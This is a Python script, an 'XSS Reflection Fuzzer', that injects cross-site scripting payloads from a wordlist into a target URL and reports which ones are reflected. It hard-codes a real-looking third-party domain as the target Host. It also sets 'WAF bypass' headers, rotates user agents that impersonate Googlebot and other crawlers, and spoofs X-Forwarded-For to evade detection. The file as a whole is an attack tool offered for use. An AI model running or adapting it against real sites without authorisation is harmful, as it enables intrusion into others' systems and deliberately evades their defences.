import requests
import random
import time
import os
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# List of commonly used User-Agent strings (you can add more if needed)
USER_AGENTS = [
    # Desktop browsers
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",

    # Mobile browsers
    "Mozilla/5.0 (Windows NT 10.0; Mobile; rv:96.0) Gecko/96.0 Firefox/96.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0 Mobile/14E304 Safari/602.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL Build/QQ3A.200805.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/16E227 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P Build/OPM6.171019.030) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",

    # Web crawlers / bots
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; DuckDuckBot/1.0; +https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; ARM; Microsoft Windows 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Edge/17.17134",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36 Edg/80.0.361.66",

    # Additional mobile User-Agent
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edge/90.0.818.56",
]


# Bypass headers for WAFs
WAF_BYPASS_HEADERS = {
    "User-Agent": random.choice(USER_AGENTS),  # Random User-Agent
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
    "Host": "gipe.ac.in",  # Change this to the target domain
    "Pragma": "no-cache",
    "Upgrade-Insecure-Requests": "1",
    "X-Requested-With": "XMLHttpRequest",  # Adding common header to avoid bot detection
    "DNT": "1",  # Do Not Track header
    "X-Forwarded-For": "123.123.123.123",  # Spoof IP for further obfuscation
}

def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
   __   __ _____ _____     _____     _                 
 __  ______ ____    _____ _   _ _______________ ____  
 \ \/ / ___/ ___|  |  ___| | | |__  /__  / ____|  _ \ 
  \  /\___ \___ \  | |_  | | | | / /  / /|  _| | |_) |
  /  \ ___) |__) | |  _| | |_| |/ /_ / /_| |___|  _ < 
 /_/\_\____/____/  |_|    \___//____/____|_____|_| \_\
             XSS Reflection Fuzzer (noface)
    """ + Style.RESET_ALL)

def main():
    banner()

    # Ask for URL
    url_template = input(Fore.YELLOW + "[?] Enter URL with FUZZ (e.g., https://site.com/search/FUZZ): " + Style.RESET_ALL).strip()
    if "FUZZ" not in url_template:
        print(Fore.RED + "[!] URL must contain 'FUZZ'" + Style.RESET_ALL)
        return

    # Ask for payload list
    wordlist_path = input(Fore.YELLOW + "[?] Enter path to XSS payload wordlist: " + Style.RESET_ALL).strip()
    if not os.path.isfile(wordlist_path):
        print(Fore.RED + "[!] Wordlist file not found." + Style.RESET_ALL)
        return

    # Ask to save vulnerable URLs
    save_results = input(Fore.YELLOW + "[?] Do you want to save reflected URLs to a file? (y/n): " + Style.RESET_ALL).strip().lower()
    output_file = ""
    if save_results == "y":
        output_file = input(Fore.YELLOW + "[?] Enter output filename (e.g., reflected.txt): " + Style.RESET_ALL).strip()
        open(output_file, 'w').close()  # Clear the file first

    print(Fore.CYAN + "\n[*] Starting fuzzing...\n")

    with open(wordlist_path, "r", encoding="utf-8") as f:
        payloads = [line.strip() for line in f if line.strip()]

    for i, payload in enumerate(payloads, 1):
        fuzzed_url = url_template.replace("FUZZ", requests.utils.quote(payload))
        
        # Add the headers with random User-Agent and WAF bypass
        headers = WAF_BYPASS_HEADERS.copy()
        headers["User-Agent"] = random.choice(USER_AGENTS)  # Randomize the User-Agent

        try:
            response = requests.get(fuzzed_url, headers=headers, timeout=10)
            if payload in response.text:
                print(Fore.RED + Style.BRIGHT + f"[{i:03}] VULNERABLE   | Payload reflected | {payload}")
                print(Fore.RED + Style.BRIGHT + f"      -> {fuzzed_url}\n")
                if output_file:
                    with open(output_file, 'a') as out:
                        out.write(f"{fuzzed_url}  # {payload}\n")
            else:
                print(Fore.GREEN + Style.BRIGHT + f"[{i:03}] NOT VULNERABLE | No reflection     | {payload}")
        except Exception as e:
            print(Fore.RED + f"[!] Error with payload [{payload}]: {e}")

    print(Fore.CYAN + "\n[*] Fuzzing completed.")
    if output_file:
        print(Fore.CYAN + f"[*] Reflected URLs saved to: {output_file}\n")

if __name__ == "__main__":
    main()
